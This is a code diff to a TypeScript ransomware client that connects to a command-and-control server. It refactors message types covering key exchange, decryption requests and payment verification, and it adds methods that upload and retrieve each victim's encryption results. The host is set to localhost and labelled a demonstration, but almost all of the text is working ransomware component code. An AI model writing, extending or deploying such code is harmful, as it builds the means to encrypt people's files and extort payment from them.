@@ -4,32 +4,11 @@
 import net from 'net';
 import fs from 'fs';
 import path from 'path';
-
-// Server configuration
-const SERVER_PORT = 4444;
-const SERVER_HOST = '127.0.0.1'; // localhost - only for demonstration
-
-// Message types for client-server communication
-export enum MessageType {
-    INITIALIZE = 'INITIALIZE',
-    STORE_IV = 'STORE_IV',
-    ENCRYPT_KEY = 'ENCRYPT_KEY',
-    DECRYPT_REQUEST = 'DECRYPT_REQUEST',
-    PAYMENT_VERIFICATION = 'PAYMENT_VERIFICATION'
-}
-
-interface ServerMessage {
-    type: string;
-    victimId?: string;
-    publicKey?: string;
-    aesKey?: string; // Base64 encoded
-    encryptedAESKey?: string; // Base64 encoded
-    privateKey?: string;
-    success?: boolean;
-    message?: string;
-    iv?: string; // Base64 encoded
-    filePath?: string;
-}
+import { 
+    MessageType, 
+    ServerMessage, 
+    SERVER_CONFIG 
+} from '../types/communication';
 
 // Client class to handle communication with the C2 server
 export class RansomwareClient {
@@ -140,10 +119,9 @@ export class RansomwareClient {
                 clearTimeout(timeout);
                 resolve(false);
             });
-            
-            // Attempt connection
+              // Attempt connection
             try {
-                this.socket!.connect(SERVER_PORT, SERVER_HOST);
+                this.socket!.connect(SERVER_CONFIG.PORT, SERVER_CONFIG.HOST);
             } catch (error) {
                 console.error('[-] Failed to initiate connection:', error);
                 clearTimeout(timeout);
@@ -348,6 +326,46 @@ export class RansomwareClient {
         }
     }
     
+    // Store encryption results on the server
+    public async storeEncryptionResults(
+        victimId: string,
+        encryptionResults: any,
+        targetDirectory: string
+    ): Promise<boolean> {
+        try {
+            const response = await this.sendMessage({
+                type: MessageType.STORE_ENCRYPTION_RESULTS,
+                victimId,
+                encryptionResults: Buffer.from(JSON.stringify(encryptionResults)).toString('base64'),
+                targetDirectory
+            });
+            
+            return response.success === true;
+        } catch (error) {
+            console.error(`[-] Failed to store encryption results: ${error}`);
+            return false;
+        }
+    }
+    
+    // Load encryption results from the server
+    public async loadEncryptionResults(victimId: string): Promise<any> {
+        try {
+            const response = await this.sendMessage({
+                type: MessageType.LOAD_ENCRYPTION_RESULTS,
+                victimId
+            });
+            
+            if (!response.success || !response.encryptionResults) {
+                throw new Error(response.message || 'Failed to load encryption results');
+            }
+            
+            const resultsBuffer = Buffer.from(response.encryptionResults, 'base64');
+            return JSON.parse(resultsBuffer.toString());
+        } catch (error) {
+            throw new Error(`Failed to load encryption results: ${error}`);
+        }
+    }
+
     // Disconnect from the server
     public disconnect(): void {
         if (this.socket) {
